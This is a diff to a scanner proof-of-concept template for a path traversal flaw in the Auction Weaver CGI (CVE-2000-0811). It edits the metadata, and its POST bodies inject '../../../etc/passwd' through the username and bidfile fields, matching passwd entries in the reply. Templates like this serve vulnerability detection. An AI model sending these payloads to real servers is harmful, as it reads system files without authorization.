@@ -1,14 +1,10 @@
 [info]
-author = "AVE"
-description = "检测 Auction Weaver 1.0-1.04 路径遍历漏洞，通过 username 或 bidfile 表单字段注入 ../ 序列读取任意文件"
+author = "ave"
+description = "通过向 Auction Weaver 表单提交包含 ../ 序列的 username 或 bidfile 参数，验证是否存在路径遍历漏洞导致任意文件读取"
 id = "POC-AVE-2000-0959"
-name = "CVE-2000-0811 PoC"
+name = "Auction Weaver 目录遍历 PoC"
 severity = "medium"
-tags = [
-    "cve-2000-0811",
-    "path-traversal",
-    "lfi",
-]
+tags = ["ave-2000-0959"]
 vuln_id = [
     "CVE-2000-0811",
     "AVE-2000-0959",
@@ -19,11 +15,11 @@ logic = "any"
 
 [[poc.requests]]
 method = "POST"
-path = "/{{BaseURL}}/cgi-bin/auctionweaver.cgi"
+path = "/{{BaseURL}}/cgi-bin/auctionweaver.pl"
 protocol = "http"
 
 [poc.requests.body]
-content = "username=../../../etc/passwd&bidfile="
+content = "username=../../../etc/passwd&password=test"
 type = "raw"
 
 [poc.requests.headers]
@@ -35,17 +31,17 @@ part = "body"
 type = "word"
 words = [
     "root:",
-    "bin:",
+    "nobody:",
     "daemon:",
 ]
 
 [[poc.requests]]
 method = "POST"
-path = "/{{BaseURL}}/cgi-bin/auctionweaver.cgi"
+path = "/{{BaseURL}}/cgi-bin/auctionweaver.pl"
 protocol = "http"
 
 [poc.requests.body]
-content = "username=&bidfile=../../../etc/passwd"
+content = "bidfile=../../../etc/passwd&bid=100"
 type = "raw"
 
 [poc.requests.headers]
@@ -57,6 +53,6 @@ part = "body"
 type = "word"
 words = [
     "root:",
-    "bin:",
+    "nobody:",
     "daemon:",
 ]
